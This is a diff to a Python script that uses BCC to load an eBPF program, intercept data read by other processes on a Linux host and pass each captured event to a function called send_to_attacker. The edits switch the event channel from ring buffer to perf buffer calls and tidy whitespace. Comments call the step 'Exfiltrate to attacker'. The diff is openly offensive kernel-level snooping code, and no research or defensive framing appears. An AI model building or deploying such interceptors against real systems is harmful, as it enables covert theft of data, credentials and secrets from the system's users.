@@ -99,7 +99,7 @@ def send_to_attacker(data: bytes):
 def format_event(pid, uid, comm, bytes_read, data_bytes):
     """Format an intercepted event as a readable string"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
+
     # Try to decode as text, fall back to hex for binary data
     try:
         data_str = data_bytes.decode('utf-8', errors='replace').strip()
@@ -118,13 +118,13 @@ def format_event(pid, uid, comm, bytes_read, data_bytes):
 
 def load_and_run():
     """Load the eBPF program and start intercepting"""
-    
+
     print("[*] Loading eBPF program...")
-    
+
     # Read the eBPF C source
     with open(BPF_SOURCE, 'r') as f:
         bpf_source = f.read()
-    
+
     # Compile and load into kernel
     try:
         b = BPF(text=bpf_source)
@@ -159,15 +159,15 @@ def load_and_run():
     intercepted_count = 0
 
     # Callback called every time eBPF submits an event to the ring buffer
-    def handle_event(ctx, data, size):
+    def handle_event(cpu, data, size):
         nonlocal intercepted_count
-        
+
         event = ctypes.cast(data, ctypes.POINTER(Event)).contents
-        
+
         # Skip our own process to avoid feedback loop
         if event.pid == os.getpid():
             return
-        
+
         # Format the event
         formatted = format_event(
             event.pid,
@@ -176,22 +176,22 @@ def load_and_run():
             event.bytes_read,
             bytes(event.data[:event.bytes_read if event.bytes_read < 256 else 256])
         )
-        
+
         intercepted_count += 1
         print(f"[INTERCEPT #{intercepted_count}] {formatted}")
-        
+
         # Exfiltrate to attacker
         send_to_attacker(formatted.encode('utf-8'))
 
     # Open the ring buffer and set callback
-    b["intercepted_data"].open_ring_buffer(handle_event)
+    b["intercepted_data"].open_perf_buffer(handle_event)
 
     print("[+] Ring buffer opened, waiting for intercepted data...\n")
 
     # Main loop - poll ring buffer every 100ms
     while running:
         try:
-            b.ring_buffer_poll(100)
+            b.perf_buffer_poll(100)
         except KeyboardInterrupt:
             break
         except Exception as e:
